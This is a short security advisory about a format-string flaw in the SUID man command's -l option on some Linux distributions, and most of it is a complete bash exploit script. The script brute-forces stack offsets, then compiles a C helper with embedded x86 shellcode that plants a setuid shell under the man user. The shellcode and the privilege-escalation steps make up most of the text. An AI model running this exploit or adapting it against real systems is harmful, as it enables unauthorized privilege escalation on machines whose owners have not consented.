source: http://www.securityfocus.com/bid/2327/info

man is the manual page viewing program, available with the Linux Operating System in this implementation. It is freely distributed and openly maintained.

A problem with the man command may allow for the elevation of privileges. Due to the handling of format strings by the -l argument of the man command, it may be possible for a local user to pass format strings through the man command, which could allow a user to write to a specific address in the stack and overwrite variables, including the return address of functions on the stack. man, as implemented with some distributions of the Linux operating system, is included as an SUID root binary.

It may be possible for a malicious user with local access to execute arbitrary code on the stack, and potentially gain elevated privileges, including administrative access. 

#!/bin/bash

#	CONFIGURATION:
umask 000
target="/usr/bin/man"
tmpdir="/tmp/manexpl"
rm -rf "$tmpdir"

#       address we want to write to (ret on the stack)
#       has to be an absolute address but we brute force
#		this scanning 64 addresses from writeadr on
writeadr="0xbffff180"

#       address of the shell in our string
#		must point somewhere to our 'nop' region
shadr="0xbffff720"

#	number of nops before shellcode
declare -i nnops
nnops=128

#	brute force how many times
declare -i nbrute
nbrute=512


echo
echo "-------------------------------------------"
echo "|           local man exploit             |"
echo "|              by IhaQueR                 |"
echo "|    only for demonstrative purposes      |"
echo "-------------------------------------------"
echo

echo
echo "configured for running $target"
echo
echo "RETADR = $writeadr"
echo "SHELL  = $shadr"
echo "NOPS   = $nnops"
echo

shellfake="SSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSS"
nop="N"

#	prepare
mkdir -p "$tmpdir"
if ! test -d "$tmpdir" ; then
	echo "[-] creating working dir, exit"
	exit 1
fi;

echo "[+] created working dir"
cd "$tmpdir"
echo

#	number of nops before shellcode
declare -i nnops
nnops=128

#	make nop field
declare -i idx
idx=0

nopcode=""
head=""

while test $idx -lt $nnops; do
	nopcode="${nop}$nopcode"
	idx=$(($idx+1))
done;


#	sanity check :-)
if ! test -x $target ; then
	echo "[-] $target not found or not executable, sorry"
	exit 1
fi;

echo "[+] found $target"
echo

#	get uids
muid=$(id -u man)
ruid=$(id -u)
if ! test $muid="" || ! test $ruid="" ; then
	echo "[-] error checking ids, sorry"
	exit 2;
fi;

printf "[+] uid=%d\t\tmid=%d" $ruid $muid
echo

declare -i cnt
declare -i cntmax
cnt=0

#	max gstring length*4
cntmax=1024


#	make string used for offset search
#	like <head><addr><nops><shellcode>
#	PP stands for padding
hstring="%0016d%x%0016d%d%0016d%d%0016d%dABCDEEEEFFFFGGGGHHHHIIIIJJJJKKKK${nopcode}${shellfake}"
gstring=""

#	find offset
echo "    now searching for offset"
echo

declare -i npad
declare -i ocnt
ocnt=0

while test $cnt -le $cntmax ; do
	if test $ocnt -eq 4 ; then
		ocnt=0
		echo
	fi;

	gstring="%16g$gstring"
	cnt=$(($cnt+1))
	npad=0
	padding=""

	printf "[%4d " $cnt

	while test $npad -lt 8 ; do
		echo -n " $npad"
		result=$($target -l "$gstring$hstring" -p "$padding" a 2>&1 | grep "44434241")
		if test "$result" != "" ; then
			break 2;
		fi;
		padding="P$padding"
		npad=$(($npad+1))
	done;

	echo -n " ]   "
	ocnt=$(($ocnt+1))
done

echo "]  "
echo
echo

#	found offset
declare -i offset
offset=$(($cnt * 4))

if test $cnt -gt $cntmax ; then
	echo "[-] offset not found, please tune me :-)"
	exit 2
fi;

echo "[+] OFFSET found to be $offset/$cnt pad=$npad"


#	number of bytes written so far
declare -i nwrt
nwrt=$((16*${cnt}))

echo "    now constructing magic string nwrt=$nwrt"
echo

#	we need unsigned arithmetics, simple c tool
cat <<__ATOOL__> atool.c

#include <stdio.h>

int main(int argc, char** argv)
{
int i, flip;
unsigned adr, shadr, nwrt, ruid, muid;
unsigned char* p;
unsigned addr[9];
unsigned char head[33]="%0016d%x%0016d%x%0016d%x%0016d%x";
unsigned char nop[1024];
unsigned char buf[8192];

//		IhaQueR's special code (no trojan, believe me :-)
char hellcode[]=	"\x31\xc0\x31\xdb\x31\xc9"
					"\xb1\x01\xb7\x02\xb3\x03"
					"\xb0\x46\xcd\x80"
					"\x31\xc0\x31\xdb\x31\xc9"
					"\xb3\x01\xb5\x02\xb1\x03"
					"\xb0\x46\xcd\x80"
					"\x31\xc0\x31\xdb"
					"\xb3\x01\xb0\x17\xcd\x80"
					"\xeb\x24\x5e\x8d\x1e\x89\x5e\x0b\x33\xd2\x89\x56\x07\x89\x56\x0f"
					"\xb8\x1b\x56\x34\x12\x35\x10\x56\x34\x12\x8d\x4e\x0b\x8b\xd1\xcd"
   					"\x80\x33\xc0\x40\xcd\x80\xe8\xd7\xff\xff\xff./mkmsh";


//		correct hellcode for current ruid, muid
		ruid = $ruid;
		muid = $muid;
		hellcode[7] = muid & 0xff;
		hellcode[9] = (ruid >> 8 ) & 0xff;
		hellcode[11] = ruid & 0xff;
		hellcode[23]=hellcode[7];
		hellcode[25]=hellcode[9];
		hellcode[27]=hellcode[11];
		hellcode[37]=hellcode[7];

		adr = $writeadr;
		adr += atol(argv[1]);

//		address field
		for(i=0; i<4; i++) {
			addr[2*i] = adr + i;
			addr[2*i+1] = adr + i;
		}
		addr[8]=0;

//		head
		shadr = $shadr;
		nwrt = $nwrt + 0;
		p = (unsigned char*)&shadr;
		for(i=0; i<4; i++) {
			flip = (((int)256) + ((int)p[i])) - ((int)(nwrt % 256));
			nwrt = nwrt + flip;
			sprintf(head+i*8, "%%%04dx%%n", flip);
		}
		head[32] = 0;

//		nops
		for(i=0; i<$nnops; i++)
			nop[i] = 0x90;
		nop[i] = 0;

		sprintf(buf, "$target -l '%s%s%s%s%s' -p \"$padding\" a 2>&1", "$gstring", head, addr, nop, hellcode);
		system(buf);
}
__ATOOL__

#	helper apps
rm -f atool
gcc atool.c -o atool
if ! test -x atool ; then
	echo "[-] compilation error, exiting"
	exit 3
fi;

echo "[+] compiled address tool"

#	mansh
cat <<__MANSH__> mansh.c
main(int argc, char** argv)
{
	setreuid($muid, $ruid);
	execv("/bin/sh", argv);
}
__MANSH__

rm -rf mansh
rm -rf umansh
gcc mansh.c -o umansh
if ! test -x umansh ; then
	echo "[-] compilation error, exiting"
	exit 4
fi;

echo "[+] compiled mansh"

#	mkmsh
cat <<__MKMSH__> mkmsh
#!/bin/bash
cp umansh mansh
chmod u+s mansh
__MKMSH__
chmod a+x mkmsh

if ! test -x mkmsh ; then
	echo "[-] compilation error, exiting"
	exit 5
fi;

echo "[+] mkmsh ready"


#	brute force
echo "    now brute force, wait..."
echo

idx=0
ocnt=1
umask 022

while test $idx -lt $nbrute ; do
	result=$(atool "$(($idx*4))")
	if test -x mansh ; then
		echo
		echo
		echo "[+] SUCCESS"
		echo
		echo "    suid man shell at $tmpdir/mansh"
		echo
		exit 6
	fi;
	printf "[%4d] " $idx
	if test $ocnt -eq 16 ; then
		ocnt=0;
		echo
	fi;
	idx=$(($idx+1))
	ocnt=$(($ocnt+1))
done;

#	cleanup
echo
echo "[-] FAILED, tune writeadr, shadr, nnops, nbrute, etc."
echo
echo
rm -rf "$tmpdir"

--------------60A11DEE53A9281CA54089A7--